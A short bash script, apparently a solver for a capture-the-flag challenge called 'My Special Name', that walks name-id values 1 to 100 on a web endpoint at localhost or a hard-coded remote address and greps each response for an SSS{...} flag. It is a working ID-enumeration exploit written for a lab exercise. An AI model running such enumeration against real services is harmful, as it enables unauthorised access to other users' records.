#!/bin/bash
PORT=8088

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.157:'$PORT
else
    url=$1':'$2
fi

# My Special Name
echo "Start exploit for My Special Name"
url=$url'/my-special-name?name-id='
for i in {1..100}
do 
    flag=$(curl -s "$url$i" | grep -o "SSS{.*}")
    if [ ${#flag} -gt 0 ];
        then break;
    fi
done

echo "Flag is $flag"
echo "-------------------------"
